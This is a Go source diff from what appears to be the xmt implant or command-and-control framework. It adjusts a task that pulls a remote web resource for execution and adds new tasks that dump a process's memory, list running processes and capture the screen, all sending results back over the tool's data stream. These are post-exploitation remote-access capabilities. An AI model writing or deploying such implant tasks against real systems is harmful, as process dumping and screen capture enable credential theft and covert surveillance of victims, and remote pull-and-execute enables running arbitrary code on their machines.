@@ -15,6 +15,7 @@ import (
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/device/screen"
 	"github.com/iDigitalFlame/xmt/man"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/crypt"
@@ -169,7 +170,7 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 		return err
 	}
 	var f *filter.Filter
-	if err = f.UnmarshalStream(r); err != nil {
+	if err = filter.UnmarshalStream(r, &f); err != nil {
 		return err
 	}
 	e, p, err := WebResource(x, w, z, u)
@@ -214,6 +215,34 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
 	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
 	return nil
+}
+func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
+	var f *filter.Filter
+	if err := filter.UnmarshalStream(r, &f); err != nil {
+		return err
+	}
+	return device.DumpProcess(f, w)
+}
+func taskProcList(_ context.Context, _ data.Reader, w data.Writer) error {
+	e, err := cmd.Processes()
+	if err != nil {
+		return err
+	}
+	if err = w.WriteUint32(uint32(len(e))); err != nil {
+		return err
+	}
+	if len(e) == 0 {
+		return err
+	}
+	for i := range e {
+		if err = e[i].MarshalStream(w); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
+	return screen.Capture(w)
 }
 
 // WebResource will attempt to download the URL target at 'u' and parse the
